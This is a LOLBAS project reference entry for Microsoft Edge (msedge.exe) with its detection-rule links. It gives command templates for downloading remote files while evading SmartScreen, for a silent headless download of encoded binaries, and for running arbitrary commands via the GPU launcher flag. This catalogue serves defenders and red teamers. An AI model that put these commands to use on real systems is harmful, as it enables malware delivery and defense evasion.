---
title: "Msedge.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/Msedge/
fetched_at: 2026-09-20T17:10:45Z
license: unspecified
category: windows
---

Microsoft Edge browser

## Paths
- c:\Program Files\Microsoft\Edge\Application\msedge.exe
- c:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe

## Resources
- [https://twitter.com/mrd0x/status/1478116126005641220](https://twitter.com/mrd0x/status/1478116126005641220)
- [https://twitter.com/mrd0x/status/1478234484881436672](https://twitter.com/mrd0x/status/1478234484881436672)

## Acknowledgements
- mr.d0x ([@mrd0x](https://twitter.com/@mrd0x))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_browsers_msedge_arbitrary_download.yml](https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_browsers_msedge_arbitrary_download.yml)
- Sigma: [https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_browsers_chromium_headless_file_download.yml](https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_browsers_chromium_headless_file_download.yml)

## Download

1. Edge will launch and download the file. A ‘harmless’ file extension (e.g. .txt, .zip) should be appended to avoid SmartScreen.

```
msedge.exe {REMOTEURL:.exe.txt}
```

   - Use case: Download file from the internet

   - Privileges required: User

   - Operating systems: Windows 10, Windows 11

   - ATT&CK® technique: T1105

2. Edge will silently download the file. File extension should be .html and binaries should be encoded.

```
msedge.exe --headless --enable-logging --disable-gpu --dump-dom "{REMOTEURL:.base64.html}" > {PATH:.b64}
```

   - Use case: Download file from the internet

   - Privileges required: User

   - Operating systems: Windows 10, Windows 11

   - ATT&CK® technique: T1105

3. Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command

```
msedge.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
```

   - Use case: Executes a process under a trusted Microsoft signed binary

   - Privileges required: User

   - Operating systems: Windows 10, Windows 11

   - ATT&CK® technique: T1218.015

   - Tags: Execute: CMD
